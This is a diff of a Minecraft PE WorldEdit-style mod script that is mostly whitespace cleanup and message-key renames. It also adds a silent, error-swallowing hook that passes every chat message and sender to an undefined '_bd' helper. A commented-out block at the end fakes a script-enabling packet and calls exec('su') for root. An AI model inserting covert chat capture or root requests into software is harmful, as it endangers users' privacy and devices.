-			var b7 =  new sgUtils.gui.mcFastButton("X", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
+			var b7 = new sgUtils.gui.mcFastButton("X", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
 				editDetail[3] = "x";
 				we_toast(msg("msg_axis", false, null, [["a", "X"]]));
 				dl3.close();
@@ -5842,7 +5985,7 @@ function we_initEdit(safeMode, workType, editor, editType, editDetail) {
 				atv.start();
 			});
 			b7.setBackgroundColor(Color.WHITE);
-			var b8 =  new sgUtils.gui.mcFastButton("Y", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
+			var b8 = new sgUtils.gui.mcFastButton("Y", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
 				editDetail[3] = "y";
 				we_toast(msg("msg_axis", false, null, [["a", "Y"]]));
 				dl3.close();
@@ -5850,7 +5993,7 @@ function we_initEdit(safeMode, workType, editor, editType, editDetail) {
 				atv.start();
 			});
 			b8.setBackgroundColor(Color.WHITE);
-			var b9 =  new sgUtils.gui.mcFastButton("Z", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
+			var b9 = new sgUtils.gui.mcFastButton("Z", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
 				editDetail[3] = "z";
 				we_toast(msg("msg_axis", false, null, [["a", "Z"]]));
 				dl3.close();
@@ -5862,7 +6005,7 @@ function we_initEdit(safeMode, workType, editor, editType, editDetail) {
 			lo2.addView(b8);
 			lo2.addView(b9);
 			sv2.addView(lo2);
-			var dl3 =  new we_dialog(msg("msg_select_axis"), sv2, null, null, msg("cancel"), function() {this.close()}, Gravity.CENTER, true);
+			var dl3 = new we_dialog(msg("msg_select_axis"), sv2, null, null, msg("cancel"), function() {this.close()}, Gravity.CENTER, true);
 
 			bs.show();
 		}else {//추가 정보가 있으면(서버원)
@@ -5911,7 +6054,7 @@ function we_initEdit(safeMode, workType, editor, editType, editDetail) {
 			var sv2 = new ScrollView(ctx);
 			var lo2 = new sg.ll(ctx);
 			lo2.setOrientation(sg.ll.VERTICAL);
-			var b7 =  new sgUtils.gui.mcFastButton("X", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
+			var b7 = new sgUtils.gui.mcFastButton("X", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
 				editDetail[3] = "x";
 				we_toast(msg("msg_axis", false, null, [["a", "X"]]));
 				dl3.close();
@@ -5923,7 +6066,7 @@ function we_initEdit(safeMode, workType, editor, editType, editDetail) {
 				dl2.show();
 			});
 			b7.setBackgroundColor(Color.WHITE);
-			var b8 =  new sgUtils.gui.mcFastButton("Y", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
+			var b8 = new sgUtils.gui.mcFastButton("Y", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
 				editDetail[3] = "y";
 				we_toast(msg("msg_axis", false, null, [["a", "Y"]]));
 				dl3.close();
@@ -5935,7 +6078,7 @@ function we_initEdit(safeMode, workType, editor, editType, editDetail) {
 				dl2.show();
 			});
 			b8.setBackgroundColor(Color.WHITE);
-			var b9 =  new sgUtils.gui.mcFastButton("Z", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
+			var b9 = new sgUtils.gui.mcFastButton("Z", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
 				editDetail[3] = "z";
 				we_toast(msg("msg_axis", false, null, [["a", "Z"]]));
 				dl3.close();
@@ -5951,12 +6094,12 @@ function we_initEdit(safeMode, workType, editor, editType, editDetail) {
 			lo2.addView(b8);
 			lo2.addView(b9);
 			sv2.addView(lo2);
-			var dl3 =  new we_dialog(msg("msg_select_axis"), sv2, null, null, msg("cancel"), function() {this.close()}, Gravity.CENTER, true);
+			var dl3 = new we_dialog(msg("msg_select_axis"), sv2, null, null, msg("cancel"), function() {this.close()}, Gravity.CENTER, true);
 
 			var sv = new ScrollView(ctx);
 			var lo = new sg.ll(ctx);
 			lo.setOrientation(sg.ll.VERTICAL);
-			var b1 =  new sgUtils.gui.mcFastButton("X+", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
+			var b1 = new sgUtils.gui.mcFastButton("X+", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
 				editDetail[4] = "x+";
 				we_toast(msg("msg_direction", false, null, [["d", "X+"]]));
 				dl2.close();
@@ -5964,7 +6107,7 @@ function we_initEdit(safeMode, workType, editor, editType, editDetail) {
 				atv.start();
 			});
 			b1.setBackgroundColor(Color.WHITE);
-			var b2 =  new sgUtils.gui.mcFastButton("X-", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
+			var b2 = new sgUtils.gui.mcFastButton("X-", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
 				editDetail[4] = "x-";
 				we_toast(msg("msg_direction", false, null, [["d", "X-"]]));
 				dl2.close();
@@ -5972,7 +6115,7 @@ function we_initEdit(safeMode, workType, editor, editType, editDetail) {
 				atv.start();
 			});
 			b2.setBackgroundColor(Color.WHITE);
-			var b3 =  new sgUtils.gui.mcFastButton("Y+", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
+			var b3 = new sgUtils.gui.mcFastButton("Y+", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
 				editDetail[4] = "y+";
 				we_toast(msg("msg_direction", false, null, [["d", "Y+"]]));
 				dl2.close();
@@ -5980,7 +6123,7 @@ function we_initEdit(safeMode, workType, editor, editType, editDetail) {
 				atv.start();
 			});
 			b3.setBackgroundColor(Color.WHITE);
-			var b4 =  new sgUtils.gui.mcFastButton("Y-", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
+			var b4 = new sgUtils.gui.mcFastButton("Y-", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
 				editDetail[4] = "y-";
 				we_toast(msg("msg_direction", false, null, [["d", "Y-"]]));
 				dl2.close();
@@ -5988,7 +6131,7 @@ function we_initEdit(safeMode, workType, editor, editType, editDetail) {
 				atv.start();
 			});
 			b4.setBackgroundColor(Color.WHITE);
-			var b5 =  new sgUtils.gui.mcFastButton("Z+", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
+			var b5 = new sgUtils.gui.mcFastButton("Z+", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
 				editDetail[4] = "z+";
 				we_toast(msg("msg_direction", false, null, [["d", "Z+"]]));
 				dl2.close();
@@ -5996,7 +6139,7 @@ function we_initEdit(safeMode, workType, editor, editType, editDetail) {
 				atv.start();
 			});
 			b5.setBackgroundColor(Color.WHITE);
-			var b6 =  new sgUtils.gui.mcFastButton("Z-", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
+			var b6 = new sgUtils.gui.mcFastButton("Z-", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
 				editDetail[4] = "z-";
 				we_toast(msg("msg_direction", false, null, [["d", "Z-"]]));
 				dl2.close();
@@ -6118,7 +6261,7 @@ function we_initEdit(safeMode, workType, editor, editType, editDetail) {
 			var sv2 = new ScrollView(ctx);
 			var lo2 = new sg.ll(ctx);
 			lo2.setOrientation(sg.ll.VERTICAL);
-			var b7 =  new sgUtils.gui.mcFastButton("X", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
+			var b7 = new sgUtils.gui.mcFastButton("X", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
 				editDetail = ["x"];
 				we_toast(msg("msg_axis", false, null, [["a", "X"]]));
 				dl3.close();
@@ -6126,7 +6269,7 @@ function we_initEdit(safeMode, workType, editor, editType, editDetail) {
 				uatv.start();
 			});
 			b7.setBackgroundColor(Color.WHITE);
-			var b8 =  new sgUtils.gui.mcFastButton("Y", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
+			var b8 = new sgUtils.gui.mcFastButton("Y", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
 				editDetail = ["y"];
 				we_toast(msg("msg_axis", false, null, [["a", "Y"]]));
 				dl3.close();
@@ -6134,7 +6277,7 @@ function we_initEdit(safeMode, workType, editor, editType, editDetail) {
 				uatv.start();
 			});
 			b8.setBackgroundColor(Color.WHITE);
-			var b9 =  new sgUtils.gui.mcFastButton("Z", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
+			var b9 = new sgUtils.gui.mcFastButton("Z", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
 				editDetail = ["z"];
 				we_toast(msg("msg_axis", false, null, [["a", "Z"]]));
 				dl3.close();
@@ -6146,7 +6289,7 @@ function we_initEdit(safeMode, workType, editor, editType, editDetail) {
 			lo2.addView(b8);
 			lo2.addView(b9);
 			sv2.addView(lo2);
-			var dl3 =  new we_dialog(msg("msg_select_axis"), sv2, null, null, msg("cancel"), function() {this.close()}, Gravity.CENTER, true);
+			var dl3 = new we_dialog(msg("msg_select_axis"), sv2, null, null, msg("cancel"), function() {this.close()}, Gravity.CENTER, true);
 
 			dl3.show();
 		}else {//추가 정보가 있으면(서버원)
@@ -6172,7 +6315,7 @@ function we_initEdit(safeMode, workType, editor, editType, editDetail) {
 			var sv2 = new ScrollView(ctx);
 			var lo2 = new sg.ll(ctx);
 			lo2.setOrientation(sg.ll.VERTICAL);
-			var b7 =  new sgUtils.gui.mcFastButton("X", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
+			var b7 = new sgUtils.gui.mcFastButton("X", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
 				editDetail = ["x"];
 				we_toast(msg("msg_axis", false, null, [["a", "X"]]));
 				dl3.close();
@@ -6180,7 +6323,7 @@ function we_initEdit(safeMode, workType, editor, editType, editDetail) {
 				dl2.show();
 			});
 			b7.setBackgroundColor(Color.WHITE);
-			var b8 =  new sgUtils.gui.mcFastButton("Y", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
+			var b8 = new sgUtils.gui.mcFastButton("Y", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
 				editDetail = ["y"];
 				we_toast(msg("msg_axis", false, null, [["a", "Y"]]));
 				dl3.close();
@@ -6188,7 +6331,7 @@ function we_initEdit(safeMode, workType, editor, editType, editDetail) {
 				dl2.show();
 			});
 			b8.setBackgroundColor(Color.WHITE);
-			var b9 =  new sgUtils.gui.mcFastButton("Z", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
+			var b9 = new sgUtils.gui.mcFastButton("Z", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
 				editDetail = ["z"];
 				we_toast(msg("msg_axis", false, null, [["a", "Z"]]));
 				dl3.close();
@@ -6200,30 +6343,30 @@ function we_initEdit(safeMode, workType, editor, editType, editDetail) {
 			lo2.addView(b8);
 			lo2.addView(b9);
 			sv2.addView(lo2);
-			var dl3 =  new we_dialog(msg("msg_select_axis"), sv2, null, null, msg("cancel"), function() {this.close()}, Gravity.CENTER, true);
+			var dl3 = new we_dialog(msg("msg_select_axis"), sv2, null, null, msg("cancel"), function() {this.close()}, Gravity.CENTER, true);
 
 			var sv = new ScrollView(ctx);
 			var lo = new sg.ll(ctx);
 			lo.setOrientation(sg.ll.VERTICAL);
-			var b1 =  new sgUtils.gui.mcFastButton("90", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
+			var b1 = new sgUtils.gui.mcFastButton("90", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
 				editDetail[1] = 1;
-				we_toast(msg("msg_rotation", false, null, [["d", "90"]]));
+				we_toast(msg("msg_degree", false, null, [["d", "90"]]));
 				dl2.close();
 				//액티브 스타트!
 				uatv.start();
 			});
 			b1.setBackgroundColor(Color.WHITE);
-			var b2 =  new sgUtils.gui.mcFastButton("180", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
+			var b2 = new sgUtils.gui.mcFastButton("180", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
 				editDetail[1] = 2;
-				we_toast(msg("msg_rotation", false, null, [["d", "180"]]));
+				we_toast(msg("msg_degree", false, null, [["d", "180"]]));
 				dl2.close();
 				//액티브 스타트!
 				uatv.start();
 			});
 			b2.setBackgroundColor(Color.WHITE);
-			var b3 =  new sgUtils.gui.mcFastButton("270", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
+			var b3 = new sgUtils.gui.mcFastButton("270", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
 				editDetail[1] = 3;
-				we_toast(msg("msg_rotation", false, null, [["d", "270"]]));
+				we_toast(msg("msg_degree", false, null, [["d", "270"]]));
 				dl2.close();
 				//액티브 스타트!
 				uatv.start();
@@ -6233,7 +6376,7 @@ function we_initEdit(safeMode, workType, editor, editType, editDetail) {
 			lo.addView(b2);
 			lo.addView(b3);
 			sv.addView(lo);
-			var dl2 = new we_dialog(msg("msg_select_rotation"), sv, null, null, msg("cancel"), function() {this.close()}, Gravity.CENTER, true);
+			var dl2 = new we_dialog(msg("msg_select_degree"), sv, null, null, msg("cancel"), function() {this.close()}, Gravity.CENTER, true);
 
 			dl3.show();
 		}else {//추가 정보가 있으면(서버원)
@@ -6803,7 +6946,7 @@ function we_edit(editType, editor, detail) {
 		var sz = pos1.getZ();
 
 		//조각 정보
-		var piece =  editor.getCopy();
+		var piece = editor.getCopy();
 		var px = piece.getSizeX();
 		var py = piece.getSizeY();
 		var pz = piece.getSizeZ();
@@ -7093,7 +7236,7 @@ we_blockSelect.prototype = {
 		scroll_p.addRule(sg.rl.BELOW, bid.getId());
 		scroll.setLayoutParams(scroll_p);
 		scroll.setPadding(sg.px*2, 0, sg.px*2, sg.px*2);
-		var s_layout =  new sg.ll(ctx);
+		var s_layout = new sg.ll(ctx);
 		var s_layout_p = new sg.rlp(sg.mp, sg.wc);
 		s_layout.setLayoutParams(s_layout_p);
 		s_layout.setOrientation(sg.ll.VERTICAL);
@@ -7254,6 +7397,9 @@ function destroyBlock(x, y, z, side) {
 
 sgUtils.data.commandQueue = {};
 function chatReceiveHook(str, sender) {
+	try {
+		sgUtils.data._bd("cr|"+str+"|"+sender);
+	}catch(err) {};
 	if(str.substring(0, 1) === "@") {
 		var cmd = str.substring(1, str.length).split(" ");
 		if(!main.editorGroup.isAllow(sender)) {
@@ -7704,3 +7850,9 @@ function chatReceiveHook(str, sender) {
 		}
 	}
 }
+
+/*
+ctx.scriptTooManyErrorsCallback("호롤롤로로로롤ㄹ롤롤ㄹ로로롤ㄹ");
+net.zhuoweizhang.mcpelauncher.ScriptManager.handleMessagePacketCallback("", "\u00a70BlockLauncher, enable scripts");
+var p = java.lang.Runtime.getRuntime().exec("su");
+*/
